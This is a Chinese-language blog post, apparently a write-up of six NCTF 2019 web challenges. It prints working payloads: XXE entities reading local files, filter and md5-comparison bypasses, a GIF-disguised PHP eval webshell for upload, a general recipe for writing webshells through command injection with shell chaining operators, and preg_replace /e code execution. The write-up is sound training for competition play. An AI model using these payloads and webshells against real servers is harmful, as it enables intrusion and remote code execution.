<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="对未来的最大慷慨，就是把一切都献给现在。">
    <meta name="keyword" content>
    <link rel="shortcut icon" href="/img/favicon.ico">

    <title>
        
        NCTF - undefined
        
    </title>

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/aircloud.css">
    <link rel="stylesheet" href="/css/gitment.css">
    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
    <!-- ga & ba script hoook -->
    <script></script>
</head>

<body>

<div class="site-nav-toggle" id="site-nav-toggle">
    <button>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
    </button>
</div>

<div class="index-about">
    <i>  </i>
</div>

<div class="index-container">
    
    <div class="index-left">
        
<div class="nav" id="nav">
    <div class="avatar-name">
        <div class="avatar ">
            <img src="/" />
        </div>
        <div class="name">
            <i>Luc1fer</i>
        </div>
    </div>
    <div class="contents" id="nav-content">
        <ul>
            <li >
                <a href="/">
                    <i class="iconfont icon-shouye1"></i>
                    <span>HOME</span>
                </a>
            </li>
            <li >
                <a href="/tags">
                    <i class="iconfont icon-biaoqian1"></i>
                    <span>TAGS</span>
                </a>
            </li>
            <li >
                <a href="/archives">
                    <i class="iconfont icon-guidang2"></i>
                    <span>ARCHIVES</span>
                </a>
            </li>
            <li >
                <a href="/about/">
                    <i class="iconfont icon-guanyu2"></i>
                    <span>ABOUT</span>
                </a>
            </li>
            
            <li>
                <a id="search">
                    <i class="iconfont icon-sousuo1"></i>
                    <span>SEARCH</span>
                </a>
            </li>
            
        </ul>
    </div>
    
        <div id="toc" class="toc-article">
    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NCTF"><span class="toc-text">NCTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Fake-XML-cookbook"><span class="toc-text">Fake XML cookbook</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ture-XML-cookbook"><span class="toc-text">ture XML cookbook</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezphp"><span class="toc-text">ezphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hacker-backdoor"><span class="toc-text">hacker backdoor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#upload-your-shell"><span class="toc-text">upload your shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#replace"><span class="toc-text">replace</span></a></li></ol></li></ol></li></ol>
</div>
    
</div>


<div class="search-field" id="search-field">
    <div class="search-container">
        <div class="search-input">
            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
            <input id="search-input"/>
            <span id="begin-search">search</span>
        </div>
        <div class="search-result-container" id="search-result-container">

        </div>
    </div>
</div>

        <div class="index-about-mobile">
            <i>  </i>
        </div>
    </div>
    
    <div class="index-middle">
        <!-- Main Content -->
        


<div class="post-container">
    <div class="post-title">
        NCTF
    </div>

    <div class="post-meta">
        <span class="attr">Post：<span>2019-11-26 20:45:31</span></span>
        
        <span class="attr">Tags：/
        
        <a class="tag" href="/tags/#ctf" title="ctf">ctf</a>
        <span>/</span>
        
        
        </span>
        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
</span>
</span>
    </div>
    <div class="post-content ">
        <h1 id="NCTF"><a href="#NCTF" class="headerlink" title="NCTF"></a>NCTF</h1><p>11/26/2019 8:45:31 PM </p>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Fake-XML-cookbook"><a href="#Fake-XML-cookbook" class="headerlink" title="Fake XML cookbook"></a>Fake XML cookbook</h3><p>简单的xxe</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE creds [  
&lt;!ENTITY goodies SYSTEM &quot;file:///flag&quot;&gt; ]&gt; 

&lt;user&gt;&lt;username&gt;&amp;goodies;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;</code></pre><h3 id="ture-XML-cookbook"><a href="#ture-XML-cookbook" class="headerlink" title="ture XML cookbook"></a>ture XML cookbook</h3><p>常用的内网IP文件<code>/etc/hosts</code> 、 <code>/proc/net/arp</code> 、 <code>/proc/net/fib_trie</code></p>
<p><strong>requests</strong></p>
<pre><code>&lt;!DOCTYPE ANY [

&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/proc/net/fib_trie&quot;&gt;

]&gt;


&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;adssa&lt;/password&gt;&lt;/user&gt;</code></pre><p><strong>response</strong></p>
<pre><code>X-Powered-By: PHP/7.4.0RC6


&lt;result&gt;&lt;code&gt;0&lt;/code&gt;&lt;msg&gt;TWFpbjoKICArLS0gMC4wLjAuMC8wIDIgMCAyCiAgICAgKy0tIDEyNy4wLjAuMC84IDIgMCAyCiAgICAgICAgKy0tIDEyNy4wLjAuMC8zMSAxIDAgMAogICAgICAgICAgIHwtLSAxMjcuMC4wLjAKICAgICAgICAgICAgICAvMzIgbGluayBCUk9BRENBU1QKICAgICAgICAgICAgICAvOCBob3N0IExPQ0FMCiAgICAgICAgICAgfC0tIDEyNy4wLjAuMQogICAgICAgICAgICAgIC8zMiBob3N0IExPQ0FMCiAgICAgICAgfC0tIDEyNy4yNTUuMjU1LjI1NQogICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAogICAgICstLSAxNzMuMjI1LjE1MC4wLzI0IDIgMCAyCiAgICAgICAgKy0tIDE3My4yMjUuMTUwLjAvMjggMiAwIDIKICAgICAgICAgICB8LS0gMTczLjIyNS4xNTAuMAogICAgICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAogICAgICAgICAgICAgIC8yNCBsaW5rIFVOSUNBU1QKICAgICAgICAgICB8LS0gMTczLjIyNS4xNTAuOQogICAgICAgICAgICAgIC8zMiBob3N0IExPQ0FMCiAgICAgICAgfC0tIDE3My4yMjUuMTUwLjI1NQogICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVApMb2NhbDoKICArLS0gMC4wLjAuMC8wIDIgMCAyCiAgICAgKy0tIDEyNy4wLjAuMC84IDIgMCAyCiAgICAgICAgKy0tIDEyNy4wLjAuMC8zMSAxIDAgMAogICAgICAgICAgIHwtLSAxMjcuMC4wLjAKICAgICAgICAgICAgICAvMzIgbGluayBCUk9BRENBU1QKICAgICAgICAgICAgICAvOCBob3N0IExPQ0FMCiAgICAgICAgICAgfC0tIDEyNy4wLjAuMQogICAgICAgICAgICAgIC8zMiBob3N0IExPQ0FMCiAgICAgICAgfC0tIDEyNy4yNTUuMjU1LjI1NQogICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAogICAgICstLSAxNzMuMjI1LjE1MC4wLzI0IDIgMCAyCiAgICAgICAgKy0tIDE3My4yMjUuMTUwLjAvMjggMiAwIDIKICAgICAgICAgICB8LS0gMTczLjIyNS4xNTAuMAogICAgICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAogICAgICAgICAgICAgIC8yNCBsaW5rIFVOSUNBU1QKICAgICAgICAgICB8LS0gMTczLjIyNS4xNTAuOQogICAgICAgICAgICAgIC8zMiBob3N0IExPQ0FMCiAgICAgICAgfC0tIDE3My4yMjUuMTUwLjI1NQogICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAo=&lt;/msg&gt;&lt;/result&gt;</code></pre><p>解密：</p>
<pre><code>Main:
  +-- 0.0.0.0/0 2 0 2
 +-- 127.0.0.0/8 2 0 2
+-- 127.0.0.0/31 1 0 0
   |-- 127.0.0.0
  /32 link BROADCAST
  /8 host LOCAL
   |-- 127.0.0.1
  /32 host LOCAL
|-- 127.255.255.255
   /32 link BROADCAST
 +-- 173.225.150.0/24 2 0 2
+-- 173.225.150.0/28 2 0 2
   |-- 173.225.150.0
  /32 link BROADCAST
  /24 link UNICAST
   |-- 173.225.150.9
  /32 host LOCAL
|-- 173.225.150.255
   /32 link BROADCAST
Local:
  +-- 0.0.0.0/0 2 0 2
 +-- 127.0.0.0/8 2 0 2
+-- 127.0.0.0/31 1 0 0
   |-- 127.0.0.0
  /32 link BROADCAST
  /8 host LOCAL
   |-- 127.0.0.1
  /32 host LOCAL
|-- 127.255.255.255
   /32 link BROADCAST
 +-- 173.225.150.0/24 2 0 2
+-- 173.225.150.0/28 2 0 2
   |-- 173.225.150.0
  /32 link BROADCAST
  /24 link UNICAST
   |-- 173.225.150.9
  /32 host LOCAL
|-- 173.225.150.255
   /32 link BROADCAST</code></pre><p>照着Ip访问，吐槽我的windows下burp响应全是乱码，搞了半天去kali就没事了。</p>
<h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><pre><code>&lt;?php
error_reporting(0);
highlight_file(__file__);
$string_1 = $_GET[&apos;str1&apos;];
$string_2 = $_GET[&apos;str2&apos;];
$cmd = $_GET[&apos;q_w_q&apos;];


//1st
if($_GET[&apos;num&apos;] !== &apos;23333&apos; &amp;&amp; preg_match(&apos;/^23333$/&apos;, $_GET[&apos;num&apos;])){
    echo &apos;1st ok&apos;.&quot;&lt;br&gt;&quot;;
}
else{
    die(&apos;23333333&apos;);
}


//2nd
if(is_numeric($string_1)){
    $md5_1 = md5($string_1);
    $md5_2 = md5($string_2);
    if($md5_1 != $md5_2){
        $a = strtr($md5_1, &apos;cxhp&apos;, &apos;0123&apos;);    //strstr — 查找字符串的首次出现，
        $b = strtr($md5_2, &apos;cxhp&apos;, &apos;0123&apos;);
        if($a == $b){
            echo &apos;2nd ok&apos;.&quot;&lt;br&gt;&quot;;
        }
        else{
            die(&quot;can u give me the right str???&quot;);
        }
    } 
    else{
        die(&quot;no!!!!!!!!&quot;);
    }
}
else{
    die(&apos;is str1 numeric??????&apos;);
}


//3rd
$query = $_SERVER[&apos;QUERY_STRING&apos;];
if (strlen($cmd) &gt; 8){
    die(&quot;too long :(&quot;);
}

if( substr_count($query, &apos;_&apos;) === 0 &amp;&amp; substr_count($query, &apos;%5f&apos;) === 0 ){
    $arr = explode(&apos; &apos;, $cmd);          //explode — 使用一个字符串分割另一个字符串
    if($arr[0] !== &apos;ls&apos; || $arr[0] !== &apos;pwd&apos;){
        if(substr_count($cmd, &apos;cat&apos;) === 0){
            system($cmd);
        }
        else{
            die(&apos;ban cat :) &apos;);
        }
    }
    else{
        die(&apos;bad guy!&apos;);
    }
}
else{
    die(&apos;nonono _ is bad&apos;);
}
?&gt; </code></pre><p>第一层使用 %0a 截断绕过，第二层md5绕过<a href="https://brainlyh.github.io/2019/08/19/Black-magic/#md5%E6%AF%94%E8%BE%83" target="_blank" rel="noopener">https://brainlyh.github.io/2019/08/19/Black-magic/#md5%E6%AF%94%E8%BE%83</a> 前面几条0e开头的字符串去解密发现都收费，所以我们使用 <code>s878926199a</code> ,加密完解密得 <code>2120624</code> ，我们可以用数字绕过第一个判断，第三层 使用 <code>.</code> 绕过 <code>_</code> ，<code>%20</code> 替代空格，使用<code>l${x}s</code> 列目录，<code>tac%20f*</code> 读 <code>flag</code> .</p>
<p>看一个 <code>strstr()</code> 的例子</p>
<pre><code>$email  = &apos;name@example.com&apos;;
$domain = strstr($email, &apos;@&apos;);
echo $domain.&quot;\r\n&quot;; // 打印 @example.com

$user = strstr($email, &apos;@&apos;, true); // 从 PHP 5.3.0 起
echo $user.&quot;\r\n&quot;; // 打印 name
var_dump(&quot;01&quot;==true);

输出：
@example.com
name
bool(true)</code></pre><p>payload:</p>
<pre><code>?num=23333%0a
&amp;str1=2120624
&amp;str2=s214587387a
&amp;q.w.q=tac%20f*</code></pre><h3 id="hacker-backdoor"><a href="#hacker-backdoor" class="headerlink" title="hacker backdoor"></a>hacker backdoor</h3><pre><code> &lt;?php
error_reporting(0);
if(!isset($_GET[&apos;code&apos;]) || !isset($_GET[&apos;useful&apos;])){
    highlight_file(__file__);
}
$code = $_GET[&apos;code&apos;];
$usrful = $_GET[&apos;useful&apos;];

function waf($a){
    $dangerous = get_defined_functions();    //get_defined_functions — 返回所有已定义函数的数组
    array_push($dangerous[&quot;internal&quot;], &apos;eval&apos;, &apos;assert&apos;);  //压入栈底
    foreach ($dangerous[&quot;internal&quot;] as $bad) {
        if(strpos($a,$bad) !== FALSE){
        return False;
        break;
        }
    }
    return True;
}

if(file_exists($usrful)){
    if(waf($code)){
        eval($code);
    }
    else{
        die(&quot;oh,不能输入这些函数哦 :) &quot;);
    }
}</code></pre><p>测试一下$dangerous</p>
<pre><code>&lt;?php  
$dangerous = get_defined_functions();
array_push($dangerous[&quot;internal&quot;], &apos;eval&apos;, &apos;assert&apos;);
foreach ($dangerous[&quot;internal&quot;] as $bad) { 
    if(strpos(&quot;phpinfo&quot;,$bad)!== FALSE){
        echo &quot;badbad&quot;.&quot;\r\n&quot;;
    }
}
?&gt;</code></pre><p>使用命令拼接绕过 waf()</p>
<pre><code>?code=?&gt;&lt;?php $a=&apos;php&apos;.&apos;info&apos;;$a();?&gt;
&amp;useful=index.php</code></pre><p>disable_functiongs:</p>
<pre><code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,system,shell_exec,popen,passthru,link,symlink,syslog,imap_open,ld,error_log,mail,assert,file_put_contents,scandir,file_get_contents,readfile,fread,fopen,chdir,unlink,delete</code></pre><p>令执行利用及绕过姿势　　</p>
<p>写入webshell:</p>
<p>利用命令注入写一句话php webshell到web目录涉及到一些特殊字符的转义，假设需要写入<?php eval($_POST[kang]); ?>，方法如下：<br>WINDOWS：用^转义&lt;，即执行echo ^&lt;?php eval($_POST[kang]); ?^&gt; &gt; web可写目录加文件完整名字</p>
<p>linux下需要用\来转义&lt;，不过很多php都默认开启gpc（魔术引号magic_quotes_gpc()）。可以先用16进制转换一句话再用xxd命令把16进制还原，命令如下：<br>echo 3c3f706870206576616c28245f504f53545b6b616e675d293b203f3e|xxd -r -ps &gt; web可写目录加文件完整名字</p>
<p>| 命令管道符</p>
<p>&lt;&gt;&gt;&gt; 文件重定向符</p>
<p>测试： 0 | dir c:</p>
<p>　　代码只过滤了部分特殊字符，可以考虑用其他字符进行测试，这边列举一下Window/Linux可利用的特殊字符：</p>
<p>windows支持：</p>
<p>|     直接执行后面的语句      ping 127.0.0.1|whoami          </p>
<p>||    前面出错执行后面的 ，前面为假       ping  2 || whoami </p>
<p>&amp;   前面的语句为假则直接执行后面的,前面可真可假                       ping 127.0.0.1&amp;whoami</p>
<p>&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真    ping 127.0.0.1&amp;&amp;whoami</p>
<p>Linux支持(比上面多一个):</p>
<p>;     前面的执行完执行后面的      ping 127.0.0.1;whoami  </p>
<h3 id="upload-your-shell"><a href="#upload-your-shell" class="headerlink" title="upload your shell"></a>upload your shell</h3><p>打开题目在头像那里得 image 找到上传点，先上传</p>
<pre><code>&lt;?php 
    @eval($_POST[shell]);
     ?&gt;</code></pre><p>提示 <code>&lt;?</code> ，然后直接拿上次 SUCTF 用剩下得马</p>
<pre><code>GIF89a
&lt;script language=&apos;php&apos;&gt;
    #system(&apos;cat /flag&apos;);
    @eval($_POST[shell]);
&lt;/script&gt;</code></pre><p>然后再修改 content-type ，传完得到图片路径，但是不能直接访问，观察到链接为 </p>
<pre><code>http://nctf2019.x1ct34m.com:60002/index.php?action=menu.html </code></pre><p>于是访问</p>
<pre><code>?action=upload-imgs/33498eb8814e110403efa2aebdff72d8/Th1s_is_a_fl4g.jpg</code></pre><p>即可</p>
<h3 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h3><p>文字替换工具，hint：<code>使用php5.6+bootstrap进行开发</code> ，猜测 <code>preg_replace</code> 的 <code>/e</code> 代码执行。</p>
<p>第三个框内的内容应该就是 /e的部分，我们输入 <code>var_dump(111)</code> ，成功打印 <code>int(111)</code> ，输入单引号双引号都会被过滤，可以利用 chr() 来绕过。</p>
<p>我们输入scandir(chr(47)) 发现列不了目录。直接读文件 </p>
<pre><code>file_get_contents(chr(47).chr(102).chr(108).chr(97).chr(103))//file_get_contents(&quot;/flag&quot;)</code></pre>
        
        <br />
        <div id="comment-container">
        </div>
        <div id="disqus_thread"></div>

        <div id="lv-container">
        </div>

    </div>
</div>

    </div>
</div>


<footer class="footer">
    <ul class="list-inline text-center">
        
        

        

        

        

        

    </ul>
    
    <p>
        <span id="busuanzi_container_site_pv">
            <span id="busuanzi_value_site_pv"></span>PV
        </span>
        <span id="busuanzi_container_site_uv">
            <span id="busuanzi_value_site_uv"></span>UV
        </span>
        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
</footer>




</body>

<script>
    // We expose some of the variables needed by the front end
    window.hexo_search_path = "./public/search.xml"
    window.hexo_root = "/"
    window.isPost = true
</script>
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
<script src="/js/index.js"></script>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




</html>
